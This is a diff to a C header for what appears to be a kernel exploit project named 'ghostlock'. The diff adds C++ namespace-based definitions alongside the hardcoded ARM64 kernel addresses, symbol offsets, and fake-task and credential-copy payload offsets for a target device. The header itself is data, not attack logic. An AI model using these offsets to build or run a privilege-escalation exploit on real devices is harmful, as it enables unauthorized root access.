@@ -1,21 +1,41 @@
 #ifndef TARGET_H
 #define TARGET_H
 
+#ifdef __cplusplus
+#include "target_constants.hpp"
+#endif
+
 #define BUILD_VARIANT_LABEL "ghostlock_oplus"
 
 /* Kernel address layout. */
+#ifdef __cplusplus
+#define KIMAGE_TEXT_BASE (::ghostlock::target::address::kImageTextBase)
+#define MTK_VADDR_BASE (::ghostlock::target::address::kMtkVirtualBase)
+#define P0_PAGE_OFFSET (::ghostlock::target::address::kPageOffset)
+#define P0_PHYS_OFFSET (::ghostlock::target::address::kPhysicalOffset)
+#define KERNELSNITCH_IDENTITY_START \
+  (::ghostlock::target::address::kKernelSnitchIdentityStart)
+#define KERNELSNITCH_IDENTITY_END \
+  (::ghostlock::target::address::kKernelSnitchIdentityEnd)
+#define DIRECT_MAP_BASE (::ghostlock::target::address::kDirectMapBase)
+#define DIRECT_MAP_END (::ghostlock::target::address::kDirectMapEnd)
+#define VMEMMAP_START (::ghostlock::target::address::kVmemmapStart)
+#else
 #define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
 #define MTK_VADDR_BASE 0xffffffc000000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
-#define QC_GKI_6_12_PHYS_LOAD 0xc7800000ULL
-#define XRING_KERNEL_PHYS_LOAD 0x80200000ULL
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END 0xffffff8c00000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END (DIRECT_MAP_BASE + (64ULL << 30))
 #define VMEMMAP_START 0xfffffffe00000000ULL
+#endif
+
+/* Device/profile defaults remain in the C compatibility layer. */
+#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
+#define QC_GKI_6_12_PHYS_LOAD 0xc7800000ULL
+#define XRING_KERNEL_PHYS_LOAD 0x80200000ULL
 
 /* Symbol offsets. */
 #define INIT_TASK_OFF 0x0211e280ULL
@@ -95,20 +115,39 @@
 #define STRUCT_SLAB_CACHE_OFF 0x08
 #define STRUCT_PAGE_TYPE_OFF 0x30
 
+#ifdef __cplusplus
+#define LOCK_OFF (::ghostlock::target::payload::kLockOffset)
+#define W0_OFF (::ghostlock::target::payload::kWaiterOffset)
+#define FOPS_OFF (::ghostlock::target::payload::kFileOperationsOffset)
+#define RIGHT_OFF (::ghostlock::target::payload::kRightNodeOffset)
+#define LEFT_OFF (::ghostlock::target::payload::kLeftNodeOffset)
+#define FAKE_TASK_OFF (::ghostlock::target::payload::kFakeTaskOffset)
+#else
 #define LOCK_OFF 0x0E80
 #define W0_OFF 0x1180
 #define FOPS_OFF 0x0F80
 #define RIGHT_OFF 0x1240
 #define LEFT_OFF 0x1260
 #define FAKE_TASK_OFF 0x1280
+#endif
 
 /* W2 payload. */
+#ifdef __cplusplus
+#define CRED_COPY_OFF (::ghostlock::target::payload::kCredentialCopyOffset)
+#else
 #define CRED_COPY_OFF 0x1080
+#endif
 
 /* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
  * fake_lock rb_leftmost zone; the cred copy follows because the pselect
  * 0x1080 slot would land inside fake_task. */
+#ifdef __cplusplus
+#define TCP_FAKE_TASK_OFF (::ghostlock::target::payload::kTcpFakeTaskOffset)
+#define TCP_CRED_COPY_OFF \
+  (::ghostlock::target::payload::kTcpCredentialCopyOffset)
+#else
 #define TCP_FAKE_TASK_OFF 0x5800
 #define TCP_CRED_COPY_OFF 0x6800
+#endif
 
 #endif
